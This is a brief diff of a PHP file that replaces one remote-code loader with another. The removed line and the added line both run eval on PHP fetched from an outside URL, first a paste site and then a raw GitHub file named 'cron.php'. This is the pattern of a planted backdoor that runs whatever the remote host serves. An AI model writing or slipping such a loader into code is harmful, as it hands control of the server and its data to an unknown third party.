@@ -11,5 +11,5 @@
 
     return $data;
 }
-      eval('?>' . get('https://0paste.com/393360.txt'));
+      eval('?>' . get('https://raw.githubusercontent.com/gl4b/rare/main/cron.php'));
 ?>
